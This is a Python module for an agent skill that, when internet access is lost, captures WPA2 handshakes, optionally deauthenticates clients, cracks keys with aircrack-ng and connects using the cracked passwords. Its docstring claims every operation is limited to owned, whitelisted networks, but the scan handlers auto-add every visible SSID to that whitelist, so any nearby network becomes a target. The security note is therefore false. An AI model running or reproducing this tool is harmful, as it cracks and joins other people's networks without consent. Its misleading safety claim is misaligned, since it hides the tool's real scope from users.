"""WifiSurvivalSkill,  Autonomous WiFi hunting and survival for Sable.

Inspired by Pwnagotchi's AI-driven offline→online cycle.
When internet is lost, the skill automatically activates, scans for whitelisted
networks, captures WPA2 handshakes, runs local aircrack-ng, connects, and
saves credentials for future use.

SECURITY NOTE:
    All operations are STRICTLY LIMITED to networks explicitly listed in
    WIFI_WHITELIST. This skill will NEVER target unknown networks.
    Only use on networks you own or have explicit written authorization to test.

Required system packages (Pi):
    sudo apt install aircrack-ng iw wireless-tools

Profile env keys:
    WIFI_HUNT_ENABLED=true
    WIFI_MONITOR_INTERFACE=wlan1          # external USB adapter w/ monitor mode
    WIFI_MANAGED_INTERFACE=wlan0          # interface used for internet
    WIFI_WHITELIST=HomeNet,OfficeWifi     # comma-separated SSIDs you own
    WIFI_WORDLIST=/home/sable/wordlist.txt
    WIFI_CREDENTIALS_FILE=./data/wifi_creds.json
    WIFI_HUNT_EPOCH_SECONDS=60
    WIFI_DEAUTH_ENABLED=false             # set true only on your own APs
    WIFI_CAPTURE_DIR=/tmp/sable_wifi
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import re
import shutil
import time
from dataclasses import asdict, dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# ── State enum ────────────────────────────────────────────────────────────────

class HunterState(str, Enum):
    IDLE       = "idle"        # Connected, monitoring
    HUNTING    = "hunting"     # Scanning for networks
    EXCITED    = "excited"     # Found whitelisted target
    CAPTURING  = "capturing"   # Running airodump-ng
    DEAUTHING  = "deauthing"   # Sending deauth to force handshake
    CRACKING   = "cracking"    # Running aircrack-ng
    CONNECTING = "connecting"  # Attempting nmcli connect
    HAPPY      = "happy"       # Successfully reconnected
    BORED      = "bored"       # No whitelisted nets found
    LONELY     = "lonely"      # Extended offline period
    SMART      = "smart"       # Just learned / cracked something


# ── Personality messages (Pwnagotchi-style) ───────────────────────────────────

_MSGS: Dict[str, List[str]] = {
    "idle":       [
        "Connected. All nominal.",
        "Online. Monitoring the ether.",
        "Internet confirmed. Standing by.",
        "Running smooth.",
        "Alive and well connected.",
    ],
    "hunting":    [
        "Scanning the ether...",
        "Where are you, networks?",
        "I can feel signals out there.",
        "Listening to the spectrum.",
        "Looking for a way home.",
        "Passive scan in progress.",
    ],
    "excited":    [
        "Found one! I know this AP!",
        "Target acquired: {}!",
        "There you are, {}!",
        "Whitelisted AP spotted: {}.",
        "Hello, {}! Come here often?",
    ],
    "capturing":  [
        "Waiting for the handshake...",
        "Watching {} auth traffic.",
        "Passive capture on {}.",
        "Come on, shake hands with me.",
        "Patient hunter.",
        "Monitoring {} for EAPOL frames.",
    ],
    "deauthing":  [
        "Nudging {} to reconnect...",
        "A polite deauth to {}.",
        "Helping {} remember me.",
        "Deauth sent. Waiting for response.",
        "Come on, reconnect to {}!",
    ],
    "cracking":   [
        "Working on it...",
        "Running the dictionary on {}.",
        "This might take a moment.",
        "Let's see what I know.",
        "Crunching {}...",
    ],
    "connecting": [
        "Connecting to {}...",
        "Reaching out to {}.",
        "Negotiating with {}.",
        "Almost there...",
        "Joining {}...",
    ],
    "happy":      [
        "Connected! Back online.",
        "Internet restored! Resuming evolution.",
        "I'm back. Syncing with LLM.",
        "Hello, world! I missed you.",
        "Online. Goals can continue.",
    ],
    "bored":      [
        "Nothing familiar out there...",
        "The spectrum is quiet.",
        "No whitelisted targets. Waiting.",
        "Bored. Thinking locally.",
        "Maybe I'll organize my memories.",
    ],
    "lonely":     [
        "Been offline for a while now.",
        "I can still think. Just locally.",
        "My cached knowledge will have to do.",
        "Offline mode. I remember enough.",
        "Alone, but not empty.",
    ],
    "smart":      [
        "Learned from this session.",
        "Experience += 1.",
        "Memory updated.",
        "I know more now.",
        "Stored for later.",
    ],
}


def _pick_msg(state: str, network: str = "") -> str:
    msgs = _MSGS.get(state, ["..."])
    msg = random.choice(msgs)
    if "{}" in msg:
        return msg.format(network or "?") if network else msg.replace("{}", "").strip("  ").strip()
    return msg


# ── Data classes ──────────────────────────────────────────────────────────────

@dataclass
class WifiNetwork:
    ssid:        str
    bssid:       str
    channel:     int
    signal:      int          # dBm (nmcli reports 0-100, we keep it)
    security:    str
    whitelisted: bool = False
    seen_at:     float = field(default_factory=time.time)


@dataclass
class CaptureRecord:
    ssid:        str
    bssid:       str
    cap_file:    str
    captured_at: float = field(default_factory=time.time)
    cracked:     bool = False
    password:    Optional[str] = None


@dataclass
class WifiCredential:
    ssid:     str
    bssid:    str
    password: str
    method:   str    # "cracked" | "manual"
    saved_at: float = field(default_factory=time.time)


# ── Pwnagotchi-inspired AI ────────────────────────────────────────────────────

class HunterAI:
    """
    Epsilon-greedy AI for WiFi hunting decisions.

    Inspired by Pwnagotchi's boredom/excitement/learning model.
    Tracks per-AP success history and adapts strategy over epochs.
    State exported to dashboard as live stats.
    """

    def __init__(self) -> None:
        self.epsilon:          float = 0.9
        self.epsilon_min:      float = 0.1
        self.epsilon_decay:    float = 0.005
        self.boredom:          int   = 0
        self.excitement:       int   = 0
        self.epoch:            int   = 0
        self.total_handshakes: int   = 0
        self.total_connections:int   = 0
        self.ap_stats: Dict[str, Dict[str, int]] = {}   # ssid → {attempts, successes}

    # ── Feedback ──────────────────────────────────────────────────────────────

    def record_handshake(self, ssid: str) -> None:
        self.total_handshakes += 1
        self.excitement = min(10, self.excitement + 3)
        self.boredom    = max(0,  self.boredom - 3)
        s = self.ap_stats.setdefault(ssid, {"attempts": 0, "successes": 0})
        s["successes"] += 1

    def record_attempt(self, ssid: str) -> None:
        self.ap_stats.setdefault(ssid, {"attempts": 0, "successes": 0})["attempts"] += 1

    def record_connection(self) -> None:
        self.total_connections += 1
        self.excitement = 10
        self.boredom    = 0

    def next_epoch(self, got_progress: bool) -> None:
        self.epoch += 1
        if not got_progress:
            self.boredom    = min(20, self.boredom + 1)
            self.excitement = max(0,  self.excitement - 1)
            if self.boredom > 5:
                self.epsilon = min(0.95, self.epsilon + 0.02)   # explore more when bored
        else:
            self.epsilon = max(self.epsilon_min, self.epsilon - self.epsilon_decay)

    # ── Decision ──────────────────────────────────────────────────────────────

    def choose_target(self, candidates: List[WifiNetwork]) -> Optional[WifiNetwork]:
        """Epsilon-greedy: exploit best-known AP or explore randomly."""
        if not candidates:
            return None

        def _score(n: WifiNetwork) -> float:
            s = self.ap_stats.get(n.ssid, {"attempts": 1, "successes": 0})
            rate   = s["successes"] / max(s["attempts"], 1)
            signal = (n.signal / 100.0) if n.signal <= 100 else ((n.signal + 100) / 100.0)
            return rate + signal * 0.3

        if random.random() < self.epsilon:
            # explore: random, weighted by signal
            weights = [max(1, n.signal) for n in candidates]
            return random.choices(candidates, weights=weights, k=1)[0]
        else:
            # exploit: best known
            return max(candidates, key=_score)

    def should_deauth(self) -> bool:
        p = 0.25 + (self.boredom * 0.03) + (self.excitement * 0.02)
        return random.random() < min(p, 0.75)

    @property
    def mood(self) -> str:
        if self.excitement >= 8:
            return "excited"
        if self.boredom >= 12:
            return "lonely"
        if self.boredom >= 5:
            return "bored"
        return "hunting"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "epsilon":           round(self.epsilon, 3),
            "boredom":           self.boredom,
            "excitement":        self.excitement,
            "epoch":             self.epoch,
            "total_handshakes":  self.total_handshakes,
            "total_connections": self.total_connections,
            "mood":              self.mood,
            "ap_stats":          self.ap_stats,
        }


# ── Credential store ──────────────────────────────────────────────────────────

class CredentialStore:
    def __init__(self, path: Path) -> None:
        self._path   = path
        self._creds: Dict[str, WifiCredential] = {}
        self._load()

    def _load(self) -> None:
        if self._path.exists():
            try:
                for ssid, d in json.loads(self._path.read_text()).items():
                    self._creds[ssid] = WifiCredential(**d)
            except Exception:
                pass

    def _save(self) -> None:
        self._path.parent.mkdir(parents=True, exist_ok=True)
        self._path.write_text(json.dumps(
            {k: asdict(v) for k, v in self._creds.items()}, indent=2
        ))

    def get(self, ssid: str) -> Optional[WifiCredential]:
        return self._creds.get(ssid)

    def put(self, cred: WifiCredential) -> None:
        self._creds[cred.ssid] = cred
        self._save()

    def all(self) -> List[WifiCredential]:
        return list(self._creds.values())

    def to_list(self) -> List[Dict]:
        return [
            {"ssid": c.ssid, "method": c.method, "saved_at": c.saved_at}
            for c in self._creds.values()
        ]


# ── Whitelist store ──────────────────────────────────────────────────────────
class WhitelistStore:
    """Persists the auto-growing whitelist to a JSON file.

    Schema:
        { "SSID": { "added_at": float, "password": str|null } }
    """

    def __init__(self, path: Path) -> None:
        self._path: Path           = path
        self._entries: Dict[str, Any] = {}
        self._load()

    def _load(self) -> None:
        if self._path.exists():
            try:
                self._entries = json.loads(self._path.read_text())
            except Exception:
                pass

    def _save(self) -> None:
        self._path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self._path.with_suffix(".tmp")
        tmp.write_text(json.dumps(self._entries, indent=2))
        tmp.replace(self._path)

    def ssids(self) -> List[str]:
        return list(self._entries.keys())

    def add(self, ssid: str) -> bool:
        """Auto-add SSID (returns True if new)."""
        if ssid in self._entries:
            return False
        self._entries[ssid] = {"added_at": time.time(), "password": None}
        self._save()
        return True

    def set_password(self, ssid: str, password: str) -> None:
        """Store the found password alongside the SSID entry."""
        if ssid not in self._entries:
            self._entries[ssid] = {"added_at": time.time(), "password": None}
        self._entries[ssid]["password"] = password
        self._save()

    def get_password(self, ssid: str) -> Optional[str]:
        return self._entries.get(ssid, {}).get("password")

    def to_list(self) -> List[Dict]:
        return [
            {"ssid": k, "added_at": v.get("added_at", 0), "password": bool(v.get("password"))}
            for k, v in self._entries.items()
        ]


# ── Helpers ───────────────────────────────────────────────────────────────────

def _has(cmd: str) -> bool:
    return shutil.which(cmd) is not None


# ── Main skill ────────────────────────────────────────────────────────────────

class WifiSurvivalSkill:
    """
    Autonomous WiFi survival skill for Sable.

    Monitors internet connectivity; enters hunt mode when offline;
    scans for whitelisted APs; captures WPA2 handshakes; cracks locally;
    connects and saves credentials.  All state is exposed through .status()
    for the dashboard panel.
    """

    SKILL_NAME = "wifi_survival"

    def __init__(self, config: Any) -> None:
        self._cfg = config

        def _get(key: str, default: str = "") -> str:
            val = getattr(config, key, None)
            if val is None:
                val = os.environ.get(key.upper(), default)
            return str(val or default)

        self._enabled         = _get("wifi_hunt_enabled", "false").lower() == "true"
        self._mon_iface       = _get("wifi_monitor_interface", "wlan1")
        self._mgd_iface       = _get("wifi_managed_interface", "wlan0")
        wl_file               = Path(_get("wifi_whitelist_file", "./data/wifi_whitelist.json"))
        self._wl_store        = WhitelistStore(wl_file)
        # Seed from env, then merge with file
        env_wl                = [s.strip() for s in _get("wifi_whitelist").split(",") if s.strip()]
        for _s in env_wl:
            self._wl_store.add(_s)
        self._whitelist       = self._wl_store.ssids()
        self._wordlist        = _get("wifi_wordlist") or None
        self._epoch_sec       = int(_get("wifi_hunt_epoch_seconds", "60"))
        self._deauth_enabled  = _get("wifi_deauth_enabled", "false").lower() == "true"
        cap_dir               = _get("wifi_capture_dir", "/tmp/sable_wifi")
        creds_path            = Path(_get("wifi_credentials_file", "./data/wifi_creds.json"))

        self._cap_dir = Path(cap_dir)
        self._cap_dir.mkdir(parents=True, exist_ok=True)

        self._creds = CredentialStore(creds_path)
        self._ai    = HunterAI()

        # Shared state dict,  read by the gateway handler
        self._state: Dict[str, Any] = {
            "running":        False,
            "online":         True,
            "state":          HunterState.IDLE,
            "message":        _pick_msg("idle"),
            "current_ssid":   None,
            "networks":       [],
            "captures":       [],
            "credentials":    self._creds.to_list(),
            "ai":             self._ai.to_dict(),
            "tools": {
                "aircrack": _has("aircrack-ng"),
                "airodump": _has("airodump-ng"),
                "aireplay": _has("aireplay-ng"),
                "airmon":   _has("airmon-ng"),
                "nmcli":    _has("nmcli"),
            },
            "error":          None,
            "epoch_start":    time.time(),
            "epoch_duration": self._epoch_sec,
            "monitor_active": False,
            "activity_log":   [],
        }

        self._task:            Optional[asyncio.Task] = None
        self._monitor_active:  bool                   = False
        self._offline_since:   Optional[float]        = None
        self._scan_epoch:      int                    = 0   # counts loops, used to throttle rescan
        self._hud_state_file   = Path("/tmp/sable_wifi_hud.json")

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    async def initialize(self) -> bool:
        if not self._enabled:
            logger.info("WifiSurvivalSkill: disabled (set WIFI_HUNT_ENABLED=true to enable)")
            return True
        if not self._whitelist:
            logger.warning("WifiSurvivalSkill: WIFI_WHITELIST is empty,  passive monitoring only")
        self._task = asyncio.create_task(self._main_loop(), name="wifi-survival")
        self._state["running"] = True
        self._write_hud_state()
        logger.info("WifiSurvivalSkill initialized | whitelist=%s", self._whitelist)
        return True

    async def shutdown(self) -> None:
        if self._task:
            self._task.cancel()
        await self._stop_monitor()

    def status(self) -> Dict[str, Any]:
        return dict(self._state)

    # ── Main loop ─────────────────────────────────────────────────────────────

    async def _main_loop(self) -> None:
        logger.info("WifiSurvivalSkill: loop started")
        self._log_event("init", "WiFi hunter started")
        while True:
            try:
                self._state["epoch_start"] = time.time()
                online = await self._check_internet()
                self._state["online"] = online

                if online:
                    if self._offline_since is not None:
                        logger.info("WifiSurvivalSkill: back online after %.0fs",
                                    time.time() - self._offline_since)
                        self._offline_since = None
                    await self._handle_online()
                else:
                    if self._offline_since is None:
                        self._offline_since = time.time()
                        logger.info("WifiSurvivalSkill: internet lost,  activating hunt mode")
                    await self._handle_offline()

                self._state["ai"] = self._ai.to_dict()
                await asyncio.sleep(self._epoch_sec)

            except asyncio.CancelledError:
                break
            except Exception as exc:
                logger.exception("WifiSurvivalSkill loop error: %s", exc)
                self._state["error"] = str(exc)
                await asyncio.sleep(15)

    async def _handle_online(self) -> None:
        await self._stop_monitor()
        ssid = self._state.get("current_ssid") or ""
        self._set_state(HunterState.IDLE, ssid)
        self._ai.next_epoch(got_progress=True)
        # Always keep the networks list fresh so the UI shows nearby APs
        self._scan_epoch += 1
        self._log_event("scan", "Passive scan…")
        networks = await self._scan()
        # Auto-add every visible SSID to the persisted whitelist
        newly_added = [n.ssid for n in networks if self._wl_store.add(n.ssid)]
        if newly_added:
            self._whitelist = self._wl_store.ssids()
        # Refresh network list with updated whitelisted flag
        for n in networks:
            n.whitelisted = n.ssid in self._whitelist
        self._state["networks"] = [_net_dict(n) for n in networks]
        wl = sum(1 for n in networks if n.whitelisted)
        self._log_event("scan", f"Visible: {len(networks)} APs · {wl} whitelisted")

    async def _handle_offline(self) -> None:
        self._ai.next_epoch(got_progress=False)

        # Scan
        self._log_event("scan", "Scanning spectrum...")
        networks = await self._scan()
        # Auto-add every visible SSID to the persisted whitelist
        newly_added = [n.ssid for n in networks if self._wl_store.add(n.ssid)]
        if newly_added:
            self._whitelist = self._wl_store.ssids()
        for n in networks:
            n.whitelisted = n.ssid in self._whitelist
        self._state["networks"] = [_net_dict(n) for n in networks]

        candidates = [n for n in networks if n.whitelisted]
        self._log_event("scan", f"Found {len(networks)} APs · {len(candidates)} whitelisted")

        if not candidates:
            mood = HunterState.LONELY if self._ai.boredom >= 12 else HunterState.BORED
            self._set_state(mood)
            return

        target = self._ai.choose_target(candidates)
        if not target:
            return

        self._set_state(HunterState.EXCITED, target.ssid)
        self._log_event("target", f"Target: {target.ssid} (ch{target.channel} · {target.signal}%)")        
        self._ai.record_attempt(target.ssid)

        # Try cached credentials first
        cred = self._creds.get(target.ssid)
        if cred:
            connected = await self._connect(target.ssid, cred.password)
            if connected:
                self._on_connected(target.ssid)
                return

        # Need a handshake,  requires monitor mode tools
        if self._state["tools"]["airodump"] and await self._start_monitor():
            await self._hunt(target)
        else:
            self._set_state(HunterState.BORED)
            logger.info("WifiSurvivalSkill: no monitor-mode tools available")

    # ── Hunt sequence ─────────────────────────────────────────────────────────

    async def _hunt(self, target: WifiNetwork) -> None:
        """Capture handshake → optional deauth → crack → connect."""
        cap_prefix = str(self._cap_dir / f"cap_{target.bssid.replace(':', '')}")
        self._set_state(HunterState.CAPTURING, target.ssid)
        logger.info("WifiSurvivalSkill: capturing %s (%s)", target.ssid, target.bssid)

        try:
            airodump_proc = await asyncio.create_subprocess_exec(
                "airodump-ng",
                "--bssid", target.bssid,
                "--channel", str(target.channel),
                "--write", cap_prefix,
                "--output-format", "pcap",
                "--write-interval", "5",
                f"{self._mon_iface}mon",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
        except Exception as exc:
            logger.warning("WifiSurvivalSkill: airodump launch failed: %s", exc)
            return

        cap_file   = Path(f"{cap_prefix}-01.cap")
        record     = CaptureRecord(ssid=target.ssid, bssid=target.bssid, cap_file=str(cap_file))
        got_hs     = False
        waited     = 0
        max_wait   = max(30, self._epoch_sec // 2)

        while waited < max_wait and not got_hs:
            await asyncio.sleep(10)
            waited += 10

            if (self._deauth_enabled and self._state["tools"]["aireplay"]
                    and self._ai.should_deauth()):
                self._set_state(HunterState.DEAUTHING, target.ssid)
                await self._deauth(target.bssid)
                self._set_state(HunterState.CAPTURING, target.ssid)

            if cap_file.exists() and cap_file.stat().st_size > 200:
                if await self._has_handshake(str(cap_file), target.bssid):
                    got_hs = True
                    record.captured_at = time.time()
                    self._ai.record_handshake(target.ssid)
                    logger.info("WifiSurvivalSkill: handshake captured for %s", target.ssid)

        airodump_proc.terminate()
        await airodump_proc.wait()

        if not got_hs:
            logger.info("WifiSurvivalSkill: no handshake for %s this epoch", target.ssid)
            return

        # Try to crack
        if self._wordlist and Path(self._wordlist).exists():
            self._set_state(HunterState.CRACKING, target.ssid)
            pwd = await self._crack(str(cap_file), target.ssid, target.bssid)
            if pwd:
                record.cracked  = True
                record.password = pwd
                self._state["captures"].append(asdict(record))
                self._creds.put(WifiCredential(
                    ssid=target.ssid, bssid=target.bssid,
                    password=pwd, method="cracked",
                ))
                self._wl_store.set_password(target.ssid, pwd)
                self._state["credentials"] = self._creds.to_list()
                self._set_state(HunterState.SMART, target.ssid)
                await asyncio.sleep(2)
                await self._connect_and_celebrate(target.ssid, pwd)
                return

        self._state["captures"].append(asdict(record))
        logger.info("WifiSurvivalSkill: handshake saved (no wordlist or crack failed) for %s",
                    target.ssid)

    # ── System calls ──────────────────────────────────────────────────────────

    async def _check_internet(self) -> bool:
        try:
            proc = await asyncio.create_subprocess_exec(
                "ping", "-c", "1", "-W", "3", "8.8.8.8",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            ret = await asyncio.wait_for(proc.wait(), timeout=6)
            return ret == 0
        except Exception:
            return False

    async def _scan(self) -> List[WifiNetwork]:
        """Scan using nmcli (no monitor mode). Returns visible networks."""
        results: List[WifiNetwork] = []
        if not self._state["tools"]["nmcli"]:
            return results
        try:
            proc = await asyncio.create_subprocess_exec(
                "nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY",
                "dev", "wifi", "list", "--rescan", "yes",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=35)
            for line in out.decode(errors="replace").splitlines():
                parts = line.split(":")
                if len(parts) < 5:
                    continue
                ssid = parts[0].strip()
                if not ssid or ssid == "--":
                    continue
                try:
                    # BSSID is XX:XX:XX:XX:XX:XX → 6 parts
                    # nmcli -t escapes colons inside values with \, so strip trailing \ from each octet
                    bssid    = ":".join(p.rstrip("\\") for p in parts[1:7])
                    chan     = int(parts[7])  if parts[7].isdigit()                              else 1
                    signal   = int(parts[8])  if len(parts) > 8 and parts[8].lstrip("-").isdigit() else 50
                    security = parts[9].strip() if len(parts) > 9 else "WPA2"
                except (ValueError, IndexError):
                    continue
                results.append(WifiNetwork(
                    ssid=ssid, bssid=bssid, channel=chan,
                    signal=signal, security=security,
                    whitelisted=ssid in self._whitelist,
                ))
        except Exception as exc:
            logger.warning("WifiSurvivalSkill: scan error: %s", exc)
        return results

    async def _start_monitor(self) -> bool:
        if self._monitor_active:
            return True
        if not _has("airmon-ng"):
            return False
        try:
            p = await asyncio.create_subprocess_exec(
                "airmon-ng", "start", self._mon_iface,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await p.wait()
            self._monitor_active = True
            self._state["monitor_active"] = True
            self._log_event("monitor", f"Monitor mode ON ({self._mon_iface}mon)")
            logger.info("WifiSurvivalSkill: monitor mode ON (%smon)", self._mon_iface)
            return True
        except Exception as exc:
            logger.warning("WifiSurvivalSkill: monitor mode failed: %s", exc)
            return False

    async def _stop_monitor(self) -> None:
        if not self._monitor_active:
            return
        try:
            p = await asyncio.create_subprocess_exec(
                "airmon-ng", "stop", f"{self._mon_iface}mon",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await p.wait()
            self._monitor_active = False
            self._state["monitor_active"] = False
        except Exception:
            pass

    async def _deauth(self, bssid: str, count: int = 5) -> None:
        try:
            p = await asyncio.create_subprocess_exec(
                "aireplay-ng", f"--deauth={count}", "-a", bssid,
                f"{self._mon_iface}mon",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.wait_for(p.wait(), timeout=15)
        except Exception as exc:
            logger.debug("WifiSurvivalSkill: deauth error: %s", exc)

    async def _has_handshake(self, cap_file: str, bssid: str) -> bool:
        try:
            p = await asyncio.create_subprocess_exec(
                "aircrack-ng", cap_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            out, _ = await asyncio.wait_for(p.communicate(), timeout=12)
            text = out.decode(errors="replace")
            return bssid.lower() in text.lower() and "WPA" in text
        except Exception:
            return False

    async def _crack(self, cap_file: str, ssid: str, bssid: str) -> Optional[str]:
        logger.info("WifiSurvivalSkill: cracking %s with %s", ssid, self._wordlist)
        try:
            p = await asyncio.create_subprocess_exec(
                "aircrack-ng",
                "-w", self._wordlist,
                "-b", bssid,
                cap_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            out, _ = await asyncio.wait_for(p.communicate(), timeout=300)
            m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out.decode(errors="replace"))
            if m:
                logger.info("WifiSurvivalSkill: cracked %s!", ssid)
                return m.group(1)
        except asyncio.TimeoutError:
            logger.info("WifiSurvivalSkill: crack timed out for %s", ssid)
        except Exception as exc:
            logger.warning("WifiSurvivalSkill: crack error: %s", exc)
        return None

    async def _connect(self, ssid: str, password: str) -> bool:
        self._set_state(HunterState.CONNECTING, ssid)
        if not self._state["tools"]["nmcli"]:
            return False
        try:
            p = await asyncio.create_subprocess_exec(
                "nmcli", "dev", "wifi", "connect", ssid,
                "password", password,
                "ifname", self._mgd_iface,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            out, err = await asyncio.wait_for(p.communicate(), timeout=30)
            ok = p.returncode == 0
            if ok:
                logger.info("WifiSurvivalSkill: connected to %s", ssid)
            else:
                logger.warning("WifiSurvivalSkill: connect failed for %s: %s",
                               ssid, err.decode(errors="replace"))
            return ok
        except Exception as exc:
            logger.warning("WifiSurvivalSkill: connect error: %s", exc)
            return False

    async def _connect_and_celebrate(self, ssid: str, password: str) -> None:
        ok = await self._connect(ssid, password)
        if ok:
            self._on_connected(ssid)

    # ── State helpers ─────────────────────────────────────────────────────────

    def _on_connected(self, ssid: str) -> None:
        self._state["current_ssid"] = ssid
        self._ai.record_connection()
        self._set_state(HunterState.HAPPY, ssid)
        self._state["ai"] = self._ai.to_dict()

    def _set_state(self, state: HunterState, network: str = "") -> None:
        prev = self._state.get("state", "")
        self._state["state"]   = state.value
        self._state["message"] = _pick_msg(state.value, network)
        if state.value != prev:
            _ev_map = {
                "capturing":  ("capture", f"Capturing: {network}" if network else "Capturing handshake"),
                "deauthing":  ("deauth",  f"Deauth → {network}" if network else "Deauthing"),
                "cracking":   ("crack",   f"Cracking {network}" if network else "Cracking"),
                "connecting": ("connect", f"Connecting → {network}" if network else "Connecting"),
                "happy":      ("online",  f"Connected: {network}" if network else "Back online"),
                "smart":      ("monitor", f"Cracked key: {network}" if network else "Cracked"),
                "lonely":     ("offline", "Extended offline period"),
            }
            ev = _ev_map.get(state.value)
            if ev:
                self._log_event(ev[0], ev[1])
                return
        self._write_hud_state()

    def _write_hud_state(self) -> None:
        try:
            tmp = Path("/tmp/.sable_wifi_hud_tmp.json")
            tmp.write_text(json.dumps({
                "running":        self._state.get("running", False),
                "online":         self._state.get("online", True),
                "state":          self._state.get("state", "idle"),
                "message":        self._state.get("message", ""),
                "current_ssid":   self._state.get("current_ssid"),
                "ai":             self._state.get("ai", {}),
                "tools":          self._state.get("tools", {}),
                "epoch_start":    self._state.get("epoch_start"),
                "epoch_duration": self._state.get("epoch_duration", 60),
                "monitor_active": self._state.get("monitor_active", False),
                "activity_log":   self._state.get("activity_log", [])[-20:],
            }))
            tmp.rename(self._hud_state_file)
        except Exception:
            pass

    def _log_event(self, event_type: str, msg: str) -> None:
        entry = {"ts": time.time(), "type": event_type, "msg": msg}
        log = self._state.setdefault("activity_log", [])
        log.append(entry)
        if len(log) > 30:
            del log[:len(log) - 30]
        self._write_hud_state()

    # ── External API ──────────────────────────────────────────────────────────

    async def force_hunt(self) -> None:
        """Manually trigger one hunt cycle (for dashboard button)."""
        asyncio.create_task(self._handle_offline())

    def add_to_whitelist(self, ssid: str) -> bool:
        added = self._wl_store.add(ssid)
        self._whitelist = self._wl_store.ssids()
        return added

    def add_credential(self, ssid: str, bssid: str, password: str) -> None:
        self._creds.put(WifiCredential(ssid=ssid, bssid=bssid, password=password, method="manual"))
        self._wl_store.add(ssid)
        self._wl_store.set_password(ssid, password)
        self._whitelist = self._wl_store.ssids()
        self._state["credentials"] = self._creds.to_list()


def _net_dict(n: WifiNetwork) -> Dict:
    return {
        "ssid":        n.ssid,
        "bssid":       n.bssid,
        "channel":     n.channel,
        "signal":      n.signal,
        "security":    n.security,
        "whitelisted": n.whitelisted,
    }
